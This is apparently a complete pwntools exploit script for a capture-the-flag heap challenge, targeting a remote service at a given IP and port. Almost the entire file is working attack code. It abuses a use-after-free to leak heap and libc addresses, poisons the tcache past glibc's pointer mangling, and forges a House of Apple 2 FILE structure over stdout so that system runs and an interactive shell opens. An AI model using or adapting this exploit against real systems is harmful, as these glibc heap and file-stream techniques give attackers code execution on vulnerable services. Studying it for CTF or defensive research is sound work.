#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from keystone import *
from capstone import *

bin_path = "./vuln_patched"
exe = context.binary = ELF(args.EXE or bin_path)
context.terminal = "alacritty -e".split()
context.log_level = "debug"
_, host, port = "nc 159.89.105.235 10001".split()

libc_path = "./libc.so.6"
ld_path = "./ld-linux-x86-64.so.2"
libc = ELF(libc_path) if libc_path else exe.libc
ld = ELF(ld_path) if ld_path else None


class LogAddressHex:
    def __getattribute__(self, name):
        try:
            resolved = eval(name)
        except:
            error(f"sigma")
            return lambda: ...

        if hasattr(resolved, "address"):
            resolved = getattr(resolved, "address")

            if not resolved & 0xFFF:
                success(term.text.bold_green(f"{name}.address & 0xFFF == 0"))
            else:
                warn(term.text.bold_yellow(f"{name}.address & 0xFFF != 0"))

        info(term.text.blue(f"{name} : {resolved:#x}"))
        return lambda: ...


logx = LogAddressHex()


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    kw["env"] = {"SHELL": "/bin/sh"}
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


def fasm(code, pp=True):
    ks = Ks(KS_ARCH_X86, KS_MODE_64 if context.arch == "amd64" else KS_MODE_32)
    if pp:
        code = cpp(code)
    encoding, _ = ks.asm(code)
    return bytes(encoding)


def fdisasm(code, vma=0x0):
    md = Cs(CS_ARCH_X86, CS_MODE_64 if context.arch == "amd64" else CS_MODE_32)
    instructions = []
    for i in md.disasm(code, vma):
        instructions.append("0x{:x}:\t{}\t{}".format(i.address, i.mnemonic, i.op_str))
    return "\n".join(instructions)


def ua(x):
    return int.from_bytes(x, "little")


def se(x):
    return str(x).encode()


def cyc(x):
    n = 8 if context.arch == "amd64" else 4
    return cyclic(x, n=n)


def solve_pow(crib=b"pwn.red"):
    if args.LOCAL:
        return
    with log.progress("Solving PoW..."):
        cmd = p.recvline_contains(crib).decode().strip()
        output = subprocess.check_output(cmd, shell=True)
        p.sendline(output)


# ================ Menu Helper Functions ================


def add(idx, size, data=b"ADAMADAM"):
    """Add a Memory - create a new chunk"""
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Memory index: ", se(idx))
    p.sendlineafter(b"How vivid is this memory? ", se(size))
    p.sendafter(b"What do you remember? ", data)


def edit(idx, data):
    """Edit a Memory - rewrite an existing chunk"""
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Which memory will you rewrite? ", se(idx))
    p.sendafter(b"Rewrite your memory: ", data)


def view(idx):
    """View a Memory - read and return the chunk content"""
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"Which memory do you wish to recall? ", se(idx))
    return p.recvline()


def free(idx):
    """Forget a Memory - free a chunk (UAF potential, no pointer nullification)"""
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"Which memory will you erase? ", se(idx))


# =======================================================

gdbscript = """
b *(main+0)
continue
""".format(**locals())

p = start()
tsz = 0x200
add(0, tsz)
add(1, tsz)
free(0)
free(1)
heap_leak = ua(view(0).rstrip())
logx.heap_leak
tcache_perthread = (heap_leak << (4 * 3)) + 0x10
logx.tcache_perthread
target_enc = tcache_perthread ^ (heap_leak)
logx.target_enc
edit(1, p64(target_enc))
add(2, tsz)

add(4, 0x100)
add(3, tsz, b"ADAMADAM" * (0x10 // 8 + 2))
add(5, 0x120)
free(4)
ub_leak = ua(view(4).rstrip())
logx.ub_leak
libc.address = ub_leak - (libc.sym.main_arena + 96)
logx.libc
IO_target = libc.sym["_IO_2_1_stdout_"]
logx.IO_target
edit(3, cyc(408) + p64(IO_target))

from pwncli import IO_FILE_plus_struct

hoa = IO_FILE_plus_struct().house_of_apple2_execmd_when_do_IO_operation(
    IO_target,
    libc.sym["_IO_wfile_jumps"],
    libc.sym.system,
)

add(6, 0x250 - 8, hoa)

p.interactive()
